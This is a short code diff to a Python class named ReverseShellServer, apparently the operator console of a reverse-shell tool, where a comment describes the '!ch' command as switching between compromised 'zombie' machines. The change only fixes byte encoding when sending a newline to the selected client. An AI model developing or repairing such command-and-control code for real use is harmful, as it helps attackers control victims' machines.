@@ -128,7 +128,7 @@ class ReverseShellServer:
             cmd = input("")
             if cmd == '!ch':                    #切换肉机指令
                 self.select_client()
-                command = self.conn.send("\n")
+                command = self.conn.send("\n".encode())
                 return
             cmd += "\n"
             command = self.conn.send(cmd.encode())
